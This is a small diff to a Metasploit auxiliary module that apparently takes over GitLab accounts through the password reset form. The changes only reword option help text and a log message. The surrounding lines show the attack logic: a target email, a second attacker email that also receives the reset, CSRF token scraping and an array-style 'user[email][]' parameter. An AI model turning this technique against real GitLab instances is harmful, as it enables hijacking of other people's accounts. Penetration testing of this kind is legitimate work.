@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('TARGETEMAIL', [ true, 'The email address to compromise' ]),
+        OptString.new('TARGETEMAIL', [ true, 'The email address of the account to compromise' ]),
         OptString.new('MYEMAIL', [ true, 'An email address to also send the password reset email to' ]),
         OptString.new('TARGETURI', [true, 'The path to GitLab', '/'])
       ]
@@ -62,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unreachable, 'No response received') if res.nil?
 
     fail_with(Failure::UnexpectedReply, 'Unable to find CSRF token') unless res.body =~ %r{<meta name="csrf-token" content="([^"]+)" />}
-    print_good("CSRF Token: #{::Regexp.last_match(1)}")
+    print_good("Received CSRF Token: #{::Regexp.last_match(1)}")
     vprint_status('Sending password reset request')
     email_field_equals = "#{CGI.escape('user[email][]')}="
     res = send_request_cgi(
